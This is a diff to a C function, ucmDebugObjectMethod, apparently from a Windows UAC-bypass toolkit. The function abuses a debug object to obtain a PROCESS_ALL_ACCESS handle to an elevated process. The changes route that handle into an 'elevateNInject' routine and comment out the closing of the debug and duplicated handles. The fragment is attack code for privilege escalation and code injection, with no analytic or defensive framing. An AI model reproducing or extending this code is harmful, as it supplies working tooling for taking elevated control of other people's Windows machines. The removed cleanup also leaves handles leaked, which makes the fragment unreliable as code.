@@ -446,7 +446,7 @@ NTSTATUS ucmDebugObjectMethod(
 
     NTSTATUS status = STATUS_ACCESS_DENIED;
 
-    HANDLE dbgHandle = NULL, dbgProcessHandle, dupHandle;
+    HANDLE dbgHandle = NULL, dbgProcessHandle;
 
     PROCESS_INFORMATION procInfo;
 
@@ -570,7 +570,7 @@ NTSTATUS ucmDebugObjectMethod(
         // Create new handle from captured with PROCESS_ALL_ACCESS.
         //
 
-        dupHandle = NULL;
+        HANDLE dupHandle = NULL;
 //        dupHandle= OpenProcess(PROCESS_ALL_ACCESS, TRUE, dbgProcessHandle);
         status = NtDuplicateObject(dbgProcessHandle,
             NtCurrentProcess(),
@@ -585,10 +585,10 @@ NTSTATUS ucmDebugObjectMethod(
             // Run new process with parent set to duplicated process handle.
             //
             //ucmxCreateProcessFromParent(dupHandle, lpszPayload);
-            elevateNInject(dupHandle);
-            NtClose(dupHandle);
+            elevateNInject(dupHandle,dbgHandle);
+           
         }
-
+       
 
 
 #pragma warning(push)
@@ -596,8 +596,6 @@ NTSTATUS ucmDebugObjectMethod(
         DbgUiSetThreadDebugObject(NULL);
 #pragma warning(pop)
 
-        NtClose(dbgHandle);
-        dbgHandle = NULL;
 
         CloseHandle(dbgProcessHandle);
 
@@ -610,7 +608,7 @@ NTSTATUS ucmDebugObjectMethod(
 
     } while (FALSE);
 
-    if (dbgHandle) NtClose(dbgHandle);
+    //if (dbgHandle) NtClose(dbgHandle);
     supSetGlobalCompletionEvent();
     return status;
 }
